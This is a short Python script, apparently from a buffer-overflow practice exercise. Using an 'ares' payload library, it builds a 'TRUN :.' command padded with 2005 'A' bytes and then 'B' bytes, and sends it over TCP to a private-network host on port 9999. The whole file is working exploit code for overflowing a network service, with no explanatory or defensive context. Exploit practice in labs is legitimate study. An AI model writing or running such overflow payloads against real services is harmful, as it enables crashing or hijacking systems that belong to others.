import ares

pattern_payload = ares.payloads.Custom.from_file("pattern.txt")
genericA = ares.payloads.Generic(length=2005)
genericB = ares.payloads.Generic(char="B")
custom_payload = ares.payloads.Custom("TRUN :." + genericA.chars + genericB.chars)

fuzzer = ares.tcp_generic.TcpGeneric(custom_payload, "192.168.0.243", 9999)
fuzzer.send()